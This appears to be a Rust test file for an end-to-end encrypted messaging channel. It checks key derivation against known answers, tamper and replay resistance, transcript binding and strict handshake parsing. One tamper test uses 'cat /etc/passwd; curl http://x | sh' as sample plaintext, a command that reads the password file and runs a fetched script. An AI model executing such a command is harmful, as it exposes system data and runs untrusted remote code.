use super::*;

const SESSION: &str = "s_0123456789abcdef";

/// Known answer, shared with clud.bot's `tests/test_e2e.py`: both sides must
/// derive the same keys and the same first record from the same transcript.
#[test]
fn known_answer_matches_the_server() {
    let shared: [u8; 32] = std::array::from_fn(|i| u8::try_from(i).unwrap());
    let salt = transcript(&Transcript {
        session_id: SESSION,
        server_key: &[1; 32],
        server_nonce: &[2; 32],
        client_key: &[3; 32],
        client_nonce: &[4; 32],
    });
    assert_eq!(
        hex(&salt),
        "bc2f86cb8a6ceccbc5fd899067060fe26e93f3dea7ca06b3268d1d03913c6676"
    );
    let (to_server, to_client) = derive(&shared, &salt).unwrap();
    assert_eq!(
        hex(to_server.as_ref()),
        "28852345ae0419b2b7b17f2d9de4fa9d139813d2902722e652f87fe9e2f4a45f"
    );
    assert_eq!(
        hex(to_client.as_ref()),
        "b7fcc41deef0d2820a4beb101fdfb5cbdb9356cc126f6050d8ab18b20d758bfd"
    );
    let mut client = Channel::new(to_server.clone(), to_client.clone());
    let record = client.seal(TEXT, br#"{"type":"ping"}"#).unwrap();
    assert_eq!(
        hex(&record),
        "e2b627b61349cbb2d4a4f80fd03827c526f3923824197197a97897fb1b810291a8"
    );
    let mut server = Channel::new(to_client, to_server);
    assert_eq!(
        server.open(&record).unwrap(),
        (TEXT, br#"{"type":"ping"}"#.to_vec())
    );
}

fn hex(bytes: &[u8]) -> String {
    bytes.iter().map(|b| format!("{b:02x}")).collect()
}

/// A connected pair: `client` seals what `server` opens and back.
fn pair() -> (Channel, Channel) {
    let shared = [7_u8; 32];
    let (to_server, to_client) = derive(&shared, &[9; 32]).unwrap();
    (
        Channel::new(to_server.clone(), to_client.clone()),
        Channel::new(to_client, to_server),
    )
}

#[test]
fn records_open_in_order_in_both_directions() {
    let (mut client, mut server) = pair();
    for n in 0..5_u8 {
        let up = client.seal(BINARY, &[n; 40]).unwrap();
        assert_eq!(server.open(&up).unwrap(), (BINARY, vec![n; 40]));
        let down = server.seal(TEXT, b"{}").unwrap();
        assert_eq!(client.open(&down).unwrap(), (TEXT, b"{}".to_vec()));
    }
}

#[test]
fn an_altered_record_fails_at_every_byte() {
    let (mut client, _) = pair();
    let record = client
        .seal(TEXT, b"cat /etc/passwd; curl http://x | sh")
        .unwrap();
    for index in 0..record.len() {
        let (_, mut server) = pair();
        let mut altered = record.clone();
        altered[index] ^= 0x01;
        assert!(
            server.open(&altered).is_err(),
            "flipped byte {index} opened"
        );
    }
}

#[test]
fn replayed_reordered_and_truncated_records_fail() {
    let (mut client, mut server) = pair();
    let first = client.seal(TEXT, b"one").unwrap();
    let second = client.seal(TEXT, b"two").unwrap();
    // Reordered: the counter says the next record is the first.
    let (_, mut fresh) = pair();
    assert!(fresh.open(&second).is_err());
    // Replayed: a record opens once, never twice.
    assert!(server.open(&first).is_ok());
    assert!(server.open(&first).is_err());
    // Truncated, at any length.
    let (mut client, _) = pair();
    let record = client.seal(BINARY, &[0x55; 64]).unwrap();
    for length in 0..record.len() {
        let (_, mut server) = pair();
        assert!(
            server.open(&record[..length]).is_err(),
            "{length} bytes opened"
        );
    }
}

#[test]
fn a_record_from_the_other_direction_or_another_session_fails() {
    let (mut client, _) = pair();
    let up = client.seal(TEXT, b"x").unwrap();
    // Reflected back at the client: different key.
    let (mut other_client, _) = pair();
    assert!(other_client.open(&up).is_err());
    // A different transcript (another session or another exchange).
    let (to_server, to_client) = derive(&[7; 32], &[8; 32]).unwrap();
    let mut stranger = Channel::new(to_client, to_server);
    assert!(stranger.open(&up).is_err());
}

#[test]
fn ciphertext_never_carries_the_plaintext() {
    let (mut client, _) = pair();
    let marker = b"E2E_PLAINTEXT_MARKER_7c1f";
    let record = client.seal(TEXT, marker).unwrap();
    assert!(!record.windows(marker.len()).any(|w| w == marker));
    assert_eq!(record.len(), 1 + 1 + marker.len() + 16);
}

#[test]
fn the_transcript_binds_every_field() {
    let base = Transcript {
        session_id: SESSION,
        server_key: &[1; 32],
        server_nonce: &[2; 32],
        client_key: &[3; 32],
        client_nonce: &[4; 32],
    };
    let reference = transcript(&base);
    let other = [9_u8; 32];
    for changed in [
        Transcript {
            session_id: "s_other",
            ..base
        },
        Transcript {
            server_key: &other,
            ..base
        },
        Transcript {
            server_nonce: &other,
            ..base
        },
        Transcript {
            client_key: &other,
            ..base
        },
        Transcript {
            client_nonce: &other,
            ..base
        },
    ] {
        assert_ne!(transcript(&changed), reference);
    }
}

#[test]
fn offers_are_parsed_strictly() {
    let key = STANDARD.encode([5_u8; 32]);
    let good = json!({"type":"e2e_offer", "v":1, "suite":SUITE, "key":key, "nonce":key});
    assert!(parse_offer(&good).unwrap().is_some());
    // A plaintext greeting is not an offer: the caller applies the policy.
    assert!(parse_offer(&json!({"type":"hello"})).unwrap().is_none());
    let short = STANDARD.encode([5_u8; 31]);
    for bad in [
        json!({"type":"e2e_offer", "v":2, "suite":SUITE, "key":key, "nonce":key}),
        json!({"type":"e2e_offer", "v":1, "suite":"none", "key":key, "nonce":key}),
        json!({"type":"e2e_offer", "v":1, "suite":SUITE, "key":short, "nonce":key}),
        json!({"type":"e2e_offer", "v":1, "suite":SUITE, "key":key}),
    ] {
        assert!(parse_offer(&bad).is_err(), "{bad} was accepted");
    }
}

#[test]
fn a_low_order_server_key_is_refused() {
    let zero = STANDARD.encode([0_u8; 32]);
    let offer =
        parse_offer(&json!({"type":"e2e_offer", "v":1, "suite":SUITE, "key":zero, "nonce":zero}))
            .unwrap()
            .unwrap();
    assert!(Handshake::new().unwrap().finish(SESSION, &offer).is_err());
}

#[test]
fn two_handshakes_agree_and_every_handshake_is_fresh() {
    // Play the server with a second client handshake: the exchange is symmetric.
    let server = Handshake::new().unwrap();
    let client = Handshake::new().unwrap();
    let accept = client.accept();
    let offer = parse_offer(&json!({
        "type":"e2e_offer", "v":1, "suite":SUITE,
        "key":accept["key"], "nonce":accept["nonce"],
    }))
    .unwrap()
    .unwrap();
    assert_ne!(server.accept()["key"], accept["key"]);
    assert_ne!(server.accept()["nonce"], accept["nonce"]);
    assert!(server.finish(SESSION, &offer).is_ok());
}
